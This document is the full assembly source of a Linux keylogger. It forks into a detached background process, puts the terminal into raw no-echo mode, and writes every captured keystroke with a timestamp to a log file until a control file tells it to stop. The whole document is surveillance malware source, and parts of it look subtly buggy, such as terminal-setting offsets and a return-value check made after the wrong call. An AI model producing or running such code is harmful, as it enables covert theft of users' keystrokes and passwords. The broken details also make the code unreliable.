section .data
    fname db "keylog.txt", 0
    ctrl_file db "k.ctrl", 0     
    fd dq 0                      ; Log file descriptor
    ctrl_fd dq 0                 ; Control file descriptor
    tbuf db "00000000000000000000", 0  ; 20 bytes for timestamp
    nl db 0xa                    ; Newline character
    s db " | ", 0                ; Separator
    debug_msg db "Keylogger started", 0xa, 0
    debug_len equ $ - debug_msg

section .bss
    buf resb 4                   ; Buffer for input (increased to handle multi-byte keys)
    tspec resq 2                 ; Timespec structure
    termios resb 60              ; struct termios
    orig_termios resb 60         ; Original termios for restoration

section .text
global _start

_start:
    ; First, create and write to control file to mark clean start
    mov rax, 2                   ; sys_open
    mov rdi, ctrl_file
    mov rsi, 102o                ; O_CREAT | O_WRONLY
    mov rdx, 0644o               ; Permissions
    syscall
    
    cmp rax, 0
    jl exit                      ; Exit if can't create file
    mov [ctrl_fd], rax
    
    ; Write empty byte to control file
    mov rax, 1                   ; sys_write
    mov rdi, [ctrl_fd]
    mov rsi, buf
    mov rdx, 1
    syscall
    
    ; Close control file
    mov rax, 3                   ; sys_close
    mov rdi, [ctrl_fd]
    syscall
    
    ; Fork to create child process
    mov rax, 57                  ; sys_fork
    syscall
    
    cmp rax, 0
    je child                     ; Child process continues
    jg parent                    ; Parent process exits
    
    ; If fork failed, exit
    mov rax, 60                  ; sys_exit
    mov rdi, 1                   ; Error code
    syscall

child:
    ; Create a new session to detach from terminal
    mov rax, 112                 ; sys_setsid
    syscall
    
    ; Open log file
    mov rax, 2                   ; sys_open
    mov rdi, fname
    mov rsi, 1102o               ; O_CREAT | O_WRONLY | O_APPEND
    mov rdx, 0644o               ; Permissions
    syscall
    
    cmp rax, 0
    jl error_exit                ; Exit if can't open log file
    mov [fd], rax
    
    ; Write debug message to log
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, debug_msg
    mov rdx, debug_len
    syscall
    
    ; Get current terminal settings from stdin
    mov rax, 16                  ; sys_ioctl
    mov rdi, 0                   ; STDIN_FILENO
    mov rsi, 0x5401              ; TCGETS
    mov rdx, termios
    syscall
    
    ; Save original termios
    mov rcx, 60                  ; Size of termios
    mov rsi, termios
    mov rdi, orig_termios
copy_loop:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    dec rcx
    jnz copy_loop
    
    ; Modify terminal flags:
    ; Clear ICANON and ECHO bits in c_lflag
    ; ICANON = 0x2, ECHO = 0x8
    mov eax, [termios+12]        ; c_lflag is at offset 12
    and eax, ~0x0A               ; Clear ICANON and ECHO bits
    mov [termios+12], eax
    
    ; Set c_cc[VMIN] = 1, c_cc[VTIME] = 0
    ; VMIN = 6, VTIME = 5
    mov byte [termios+17], 1     ; c_cc[VMIN] = 1 (need at least 1 char)
    mov byte [termios+16], 0     ; c_cc[VTIME] = 0 (no timeout)
    
    ; Apply modified terminal settings
    mov rax, 16                  ; sys_ioctl
    mov rdi, 0                   ; STDIN_FILENO
    mov rsi, 0x5402              ; TCSETS
    mov rdx, termios
    syscall

main_loop:
    ; Check control file
    mov rax, 2                   ; sys_open
    mov rdi, ctrl_file
    mov rsi, 0                   ; O_RDONLY
    mov rdx, 0
    syscall
    
    cmp rax, 0
    jl continue_loop             ; If can't open, just continue
    
    mov [ctrl_fd], rax
    
    ; Read from control file
    mov rax, 0                   ; sys_read
    mov rdi, [ctrl_fd]
    mov rsi, buf
    mov rdx, 1
    syscall
    
    ; Close control file
    mov rax, 3                   ; sys_close
    mov rdi, [ctrl_fd]
    syscall
    
    ; If we read a byte and it's not 0, exit
    cmp rax, 1
    jne continue_loop
    cmp byte [buf], 0
    jne cleanup_exit

continue_loop:
    ; Get current time
    mov rax, 228                 ; sys_clock_gettime
    mov rdi, 0                   ; CLOCK_REALTIME
    mov rsi, tspec
    syscall

    ; Read keyboard input (non-blocking)
    mov rax, 0                   ; sys_read
    mov rdi, 0                   ; STDIN_FILENO
    mov rsi, buf
    mov rdx, 4                   ; Read up to 4 bytes (for multi-byte chars)
    syscall

    ; If no data or error, continue
    cmp rax, 0
    jle main_loop

    ; Convert timestamp to string
    mov rax, [tspec]             ; Seconds part
    mov rdi, tbuf
    call format_time

    ; Write timestamp to log
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, tbuf
    mov rdx, 20                  ; Length of timestamp
    syscall

    ; Write separator
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, s
    mov rdx, 3
    syscall

    ; Write keystroke (rax contains bytes read)
    mov rdx, rax                 ; Number of bytes to write
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, buf
    syscall

    ; Write newline
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, nl
    mov rdx, 1
    syscall

    ; Small sleep to avoid CPU hogging
    mov qword [tspec], 0         ; tv_sec = 0
    mov qword [tspec+8], 10000000 ; tv_nsec = 10ms
    mov rax, 35                  ; sys_nanosleep
    mov rdi, tspec
    mov rsi, 0                   ; Don't care about remaining time
    syscall

    jmp main_loop

cleanup_exit:
    ; Restore original terminal settings
    mov rax, 16                  ; sys_ioctl
    mov rdi, 0                   ; STDIN_FILENO
    mov rsi, 0x5402              ; TCSETS
    mov rdx, orig_termios
    syscall

    ; Close log file
    mov rax, 3                   ; sys_close
    mov rdi, [fd]
    syscall

error_exit:
    ; Exit with error code
    mov rax, 60                  ; sys_exit
    mov rdi, 1
    syscall

parent:
    ; Parent just exits immediately
    mov rax, 60                  ; sys_exit
    xor rdi, rdi
    syscall

exit:
    ; Normal exit
    mov rax, 60                  ; sys_exit
    xor rdi, rdi
    syscall

; Format time function
format_time:
    push rbx
    push rcx
    
    mov rbx, 10                  ; Base 10
    add rdi, 19                  ; Point to end of buffer
    mov byte [rdi], 0            ; Null terminator
    
    mov rcx, 19                  ; Counter for digits
.loop:
    dec rdi
    xor rdx, rdx
    div rbx
    add dl, '0'                  ; Convert to ASCII
    mov [rdi], dl                ; Store digit
    dec rcx
    test rax, rax
    jnz .loop                    ; Continue until number is converted
    
    ; Fill remaining positions with zeros
    test rcx, rcx
    jz .done
.fill_zeros:
    dec rdi
    mov byte [rdi], '0'
    dec rcx
    jnz .fill_zeros
    
.done:
    pop rcx
    pop rbx
    ret